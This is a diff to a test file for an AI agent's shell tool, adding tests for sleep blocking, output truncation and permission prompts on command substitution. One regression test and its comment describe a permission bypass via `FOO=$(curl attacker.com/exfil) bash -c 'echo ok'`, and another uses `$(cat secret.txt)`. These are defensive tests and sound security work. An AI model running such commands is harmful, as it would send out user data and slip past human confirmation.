@@ -160,6 +160,52 @@ describe('ShellTool', () => {
       ).toThrow('Command cannot be empty.');
     });
 
+    it('should mention the intentional sleep escape hatch when blocking sleep', async () => {
+      const error = shellTool.validateToolParams({
+        command: 'sleep 5',
+        is_background: false,
+      });
+
+      expect(error).toContain('intentional-sleep:');
+    });
+
+    it('should explain rejected intentional sleep comments', async () => {
+      const shortReasonError = shellTool.validateToolParams({
+        command: 'sleep 5 # intentional-sleep: wait',
+        is_background: false,
+      });
+      const overCapError = shellTool.validateToolParams({
+        command:
+          'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
+        is_background: false,
+      });
+
+      expect(shortReasonError).toContain('reason is too short');
+      expect(shortReasonError).not.toContain('add a trailing comment like');
+      expect(overCapError).toContain('foreground sleeps over 10 minutes');
+      expect(overCapError).not.toContain('add a trailing comment like');
+    });
+
+    it('should allow sleep with a valid intentional sleep comment', async () => {
+      const error = shellTool.validateToolParams({
+        command: 'sleep 5 # intentional-sleep: wait for MCP rate limit reset',
+        is_background: false,
+      });
+
+      expect(error).toBeNull();
+    });
+
+    it('should guide model to split and use intentional-sleep for sleep chains', async () => {
+      const error = shellTool.validateToolParams({
+        command: 'sleep 5 && echo ok',
+        is_background: false,
+      });
+
+      expect(error).toContain('Split into two calls');
+      expect(error).toContain('intentional-sleep:');
+      expect(error).toContain('reason');
+    });
+
     it('should throw an error for a relative directory path', async () => {
       expect(() =>
         shellTool.build({
@@ -469,6 +515,15 @@ describe('ShellTool', () => {
         'Background shell commands must not end with a bare "&". Remove the trailing "&" and rely on is_background: true instead.',
       );
       expect(mockShellExecutionService).not.toHaveBeenCalled();
+    });
+
+    it('keeps pre-existing comment trimming behavior for managed background validation', async () => {
+      const invocation = shellTool.build({
+        command: 'echo ok # note\nsleep 5 &',
+        is_background: true,
+      });
+
+      expect(invocation).toBeDefined();
     });
 
     it('preserves a trailing && (logical AND would be syntactically broken otherwise)', async () => {
@@ -1449,6 +1504,42 @@ describe('ShellTool', () => {
         } finally {
           // Restore even if assertions throw — otherwise the
           // truncateToolOutput spy leaks into subsequent tests.
+          spy.mockRestore();
+        }
+      });
+
+      it('truncates shell output char-only so the line cap cannot undercut the char budget', async () => {
+        // Regression (C2): the in-tool truncateToolOutput call omitted `lines`,
+        // so it fell back to the config line cap (default 1000). Many-short-line
+        // output (find /, ls -R) then got line-truncated while the 30k char
+        // budget still had room — contradicting the per-tool char-only contract.
+        // Pin that shell declares lines: Infinity.
+        const truncationModule = await import('../utils/truncation.js');
+        const spy = vi
+          .spyOn(truncationModule, 'truncateToolOutput')
+          .mockResolvedValue({ content: 'unused', outputFile: undefined });
+        try {
+          const invocation = shellTool.build({
+            command: 'find /',
+            is_background: false,
+          });
+          const promise = invocation.execute(mockAbortSignal);
+          await vi.advanceTimersByTimeAsync(1_000);
+          resolveShellExecution({
+            output: 'short line\n'.repeat(50),
+            exitCode: 0,
+          });
+          await promise;
+
+          // Shell must pass lines: Infinity so the global line cap can't
+          // undercut its declared 30k char budget.
+          expect(spy).toHaveBeenCalledWith(
+            expect.anything(),
+            ShellTool.Name,
+            expect.any(String),
+            expect.objectContaining({ lines: Number.POSITIVE_INFINITY }),
+          );
+        } finally {
           spy.mockRestore();
         }
       });
@@ -4860,6 +4951,39 @@ describe('ShellTool', () => {
       expect(permission).toBe('allow');
     });
 
+    // Regression coverage for PR #4386 round 6 (cid 3298521039): the
+    // env-prefix wrapper substitution bypass. `getDefaultPermission`
+    // calls `stripShellWrapper(this.params.command)` BEFORE the AST
+    // check; that strip discards a leading env-assignment AND unwraps a
+    // `bash -c '...'` invocation, so for `FOO=$(curl evil) bash -c
+    // 'echo ok'` the AST never sees the substitution and classifies
+    // the residual `echo ok` as read-only → `'allow'` → silent
+    // auto-execute. The R4 AST top-level guard only catches
+    // substitution that survives stripShellWrapper; this case slips
+    // past entirely. Fix gates on substitution against the ORIGINAL
+    // command before stripping.
+    it('asks (not allow) for env-prefix substitution inside a bash wrapper', async () => {
+      const invocation = shellTool.build({
+        command: `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
+        is_background: false,
+      });
+
+      const permission = await invocation.getDefaultPermission();
+
+      // Must be 'ask' so the confirmation dialog (with substitution
+      // warning) is shown — NOT 'allow' which would silently execute.
+      expect(permission).toBe('ask');
+    });
+
+    it('asks for backtick env-prefix substitution inside a bash wrapper', async () => {
+      const invocation = shellTool.build({
+        command: `FOO=\`whoami\` bash -c 'ls -la'`,
+        is_background: false,
+      });
+
+      expect(await invocation.getDefaultPermission()).toBe('ask');
+    });
+
     it('should request confirmation for a non-read-only command and return details', async () => {
       const params = { command: 'npm install', is_background: false };
       const invocation = shellTool.build(params);
@@ -4967,6 +5091,94 @@ describe('ShellTool', () => {
       expect(() =>
         shellTool.build({ command: '', is_background: false }),
       ).toThrow();
+    });
+
+    // Regression coverage for issue #4093: command substitution must be
+    // visibly flagged in the confirmation prompt rather than silently
+    // denied. See ShellToolInvocation.getConfirmationDetails for context.
+    describe('command substitution warning (issue #4093)', () => {
+      it('surfaces a warning for $() command substitution', async () => {
+        const invocation = shellTool.build({
+          command: 'python3 -c "print($(echo hello))"',
+          is_background: false,
+        });
+        const details = (await invocation.getConfirmationDetails(
+          new AbortController().signal,
+        )) as { warnings?: string[] };
+
+        expect(details.warnings).toBeDefined();
+        expect(details.warnings).toHaveLength(1);
+        expect(details.warnings?.[0]).toMatch(/command substitution/i);
+      });
+
+      it('surfaces a warning for backtick command substitution', async () => {
+        const invocation = shellTool.build({
+          command: 'echo `whoami`',
+          is_background: false,
+        });
+        const details = (await invocation.getConfirmationDetails(
+          new AbortController().signal,
+        )) as { warnings?: string[] };
+
+        expect(details.warnings?.[0]).toMatch(/command substitution/i);
+      });
+
+      it('surfaces a warning for <() process substitution', async () => {
+        const invocation = shellTool.build({
+          command: 'diff <(ls /a) <(ls /b)',
+          is_background: false,
+        });
+        const details = (await invocation.getConfirmationDetails(
+          new AbortController().signal,
+        )) as { warnings?: string[] };
+
+        expect(details.warnings?.[0]).toMatch(/command substitution/i);
+      });
+
+      it('surfaces a warning for >() output process substitution', async () => {
+        const invocation = shellTool.build({
+          command: 'echo data > >(tee log.txt)',
+          is_background: false,
+        });
+        const details = (await invocation.getConfirmationDetails(
+          new AbortController().signal,
+        )) as { warnings?: string[] };
+
+        expect(details.warnings?.[0]).toMatch(/command substitution/i);
+      });
+
+      it('does not set warnings on commands without substitution', async () => {
+        const invocation = shellTool.build({
+          command: 'npm install',
+          is_background: false,
+        });
+        const details = (await invocation.getConfirmationDetails(
+          new AbortController().signal,
+        )) as { warnings?: string[] };
+
+        // `warnings` should be omitted entirely when there's nothing to flag.
+        expect(details.warnings).toBeUndefined();
+      });
+
+      // Regression coverage for PR #4386 R4 (cid 3293075622): the
+      // `|| detectCommandSubstitution(rawCommand)` branch of
+      // `buildShellExecWarnings` only fires for shapes where
+      // `stripShellWrapper` yields a substitution-free inner command
+      // (here `echo ok`) but the raw command has substitution in the
+      // env-prefix. Without this case, removing the `||` clause would
+      // not regress any test in this describe block.
+      it('surfaces a warning for substitution in the env-prefix of a shell wrapper', async () => {
+        const invocation = shellTool.build({
+          command: `FOO=$(cat secret.txt) bash -c 'echo ok'`,
+          is_background: false,
+        });
+        const details = (await invocation.getConfirmationDetails(
+          new AbortController().signal,
+        )) as { warnings?: string[] };
+
+        expect(details.warnings).toBeDefined();
+        expect(details.warnings?.[0]).toMatch(/command substitution/i);
+      });
     });
   });
 
@@ -5393,7 +5605,8 @@ describe('detectBlockedSleepPattern', () => {
 
   it('blocks sleep followed by a top-level shell comment', () => {
     // Shell ignores trailing comments, so these are equivalent to
-    // standalone foreground sleeps and must not bypass the guard.
+    // standalone foreground sleeps unless they use the explicit
+    // intentional-sleep escape hatch.
     expect(detectBlockedSleepPattern('sleep 5 # wait')).toBe(
       'standalone sleep 5',
     );
@@ -5404,6 +5617,69 @@ describe('detectBlockedSleepPattern', () => {
       'standalone sleep 2s',
     );
     expect(detectBlockedSleepPattern('sleep 5 && echo ok # trailing')).toBe(
+      'sleep 5 followed by: echo ok',
+    );
+  });
+
+  it('allows standalone sleep with an intentional sleep comment', () => {
+    expect(
+      detectBlockedSleepPattern(
+        'sleep 5 # intentional-sleep: wait for MCP rate limit reset',
+      ),
+    ).toBeNull();
+    expect(
+      detectBlockedSleepPattern(
+        'sleep 2s # intentional-sleep: deliberate rate limit backoff',
+      ),
+    ).toBeNull();
+    expect(
+      detectBlockedSleepPattern(
+        'sleep 10m # intentional-sleep: wait for MCP rate limit reset',
+      ),
+    ).toBeNull();
+  });
+
+  it('requires a meaningful intentional sleep reason', () => {
+    expect(detectBlockedSleepPattern('sleep 5 # intentional-sleep:')).toBe(
+      'standalone sleep 5',
+    );
+    expect(detectBlockedSleepPattern('sleep 5 # intentional-sleep: wait')).toBe(
+      'standalone sleep 5',
+    );
+    expect(
+      detectBlockedSleepPattern('sleep 5 # intentional-sleep: 1234567'),
+    ).toBe('standalone sleep 5');
+    expect(
+      detectBlockedSleepPattern('sleep 5 # intentional-sleep: 12345678'),
+    ).toBeNull();
+  });
+
+  it('blocks intentional sleep comments above the duration cap', () => {
+    expect(
+      detectBlockedSleepPattern(
+        'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
+      ),
+    ).toBe('standalone sleep 601s');
+  });
+
+  it('does not allow intentional sleep comments on leading sleep chains', () => {
+    expect(
+      detectBlockedSleepPattern(
+        'sleep 5 && echo ok # intentional-sleep: wait for rate limit reset',
+      ),
+    ).toBe('sleep 5 followed by: echo ok');
+  });
+
+  it('does not allow intentional sleep comments to hide newline commands', () => {
+    expect(
+      detectBlockedSleepPattern(
+        'sleep 5 # intentional-sleep: wait for rate limit reset\necho ok',
+      ),
+    ).toBe('sleep 5 followed by: echo ok');
+  });
+
+  it('preserves commands after a shell comment newline', () => {
+    expect(detectBlockedSleepPattern('sleep 5 # wait\necho ok')).toBe(
       'sleep 5 followed by: echo ok',
     );
   });
